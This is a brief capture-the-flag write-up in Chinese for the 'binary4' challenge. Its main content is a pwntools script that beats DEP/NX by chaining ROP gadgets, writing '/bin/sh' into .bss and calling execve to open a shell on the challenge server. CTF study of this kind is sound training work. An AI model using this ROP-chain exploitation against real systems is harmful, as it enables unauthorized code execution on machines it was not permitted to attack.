## binary4
題目開啟DEP/NX，使用ROP將`"/bin/sh"`寫入`.bss`，之後執行`execve()`，使用ROPgadget找出gadgets然後組合。

### exploit
```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux')

binary = ELF('simplerop_revenge')
rop = ROP(binary)

payload = cyclic(40).encode()
payload += flat(rop.rax.address, int(constants.SYS_execve), 0, 0) # rax = SYS_execve, rdx = rbx = 0
payload += flat(rop.rsi.address, int.from_bytes(b'/bin/sh\x00', byteorder='little')) # rsi = "/bin/sh\x00"
payload += flat(rop.rdi.address, binary.bss()) # rdi = bss
payload += p64(0x47a502) # *bss = rdi gadget
payload += flat(rop.rsi.address, 0) # rsi = 0
payload += p64(rop.find_gadget(['syscall', 'ret']).address) # jmp to syscall

r = remote('pwnhub.tw', 8361)
r.sendline(payload)
r.interactive()
```
